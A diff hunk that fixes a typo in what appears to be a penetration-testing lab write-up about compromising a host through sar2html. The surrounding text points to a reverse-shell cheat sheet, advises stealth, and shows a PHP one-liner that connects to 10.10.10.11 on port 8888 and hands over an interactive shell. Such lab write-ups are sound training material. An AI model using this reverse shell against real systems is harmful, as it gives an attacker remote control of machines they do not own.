@@ -145,7 +145,7 @@ Well, that's seems pretty obvious that we should poke at sar2html and then see a
 
 ## Initial Compromise
 
-When I'm learning, I like to go nuts to see what commands can and cannot be run remotely, but keep in mind in the real world you want to be stealthy.  Since I knew we were running PHP, this is a great time to try a PHP shell.  I'm making my own cheat sheet for shells, but you can't go wrong with [PenTestMonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).  I could see of I can run the php command right there in the URL, but I didn't like the way the output was sort of hidden and again, be stealthy, try not to put too much in the URL.
+When I'm learning, I like to go nuts to see what commands can and cannot be run remotely, but keep in mind in the real world you want to be stealthy.  Since I knew we were running PHP, this is a great time to try a PHP shell.  I'm making my own cheat sheet for shells, but you can't go wrong with [PenTestMonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).  I could see if I can run the php command right there in the URL, but I didn't like the way the output was sort of hidden and again, be stealthy, try not to put too much in the URL.
 
 So, I copy over my shell and save it as shell.sh to send to the victim:
 >  php -r '$sock=fsockopen("10.10.10.11",8888);exec("/bin/sh -i <&3 >&3 2>&3");'
